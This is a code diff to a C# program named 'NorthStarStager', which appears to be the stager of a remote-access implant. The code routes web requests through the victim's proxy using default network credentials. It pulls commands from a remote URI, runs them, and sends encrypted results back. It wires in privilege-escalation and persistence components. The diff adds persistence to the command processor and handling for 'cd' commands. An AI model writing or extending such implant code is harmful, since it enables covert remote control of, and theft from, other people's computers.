@@ -24,7 +24,7 @@ namespace NorthStarStager
 
         static void Main(string[] args)
         {
-
+          
             WebClient web = new WebClient();
             web.Proxy = WebRequest.GetSystemWebProxy();
             web.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
@@ -34,9 +34,10 @@ namespace NorthStarStager
             privilegeEscalation privs = new privilegeEscalation();
             sendRetrieve sendOrRetrieve = new sendRetrieve();
             Chiper chipops = new Chiper();
-            processCommand proc = new processCommand(enumEnv, privs);
-            registerIn register;
             addPersistence persistence = new addPersistence();
+            processCommand proc = new processCommand(enumEnv, privs, persistence);
+            registerIn register;
+         
 
             int waitTimeCounter = 0;
            
@@ -115,6 +116,10 @@ namespace NorthStarStager
                                     {
                                         sendOrRetrieve._sendResult(proc._parseCommand(comm), web, enumEnv, chipops);
                                     }
+                                    else if(comm.Contains("cd ") && !comm.Contains("cd ,"))
+                                    {
+                                    sendOrRetrieve._sendResult(proc._parseCommand(comm), web, enumEnv, chipops);
+                                     }
                                     else
                                     {
                                         proc._cmdMode(comm, sendOrRetrieve, enumEnv, web, chipops, commandRetrieveUri);
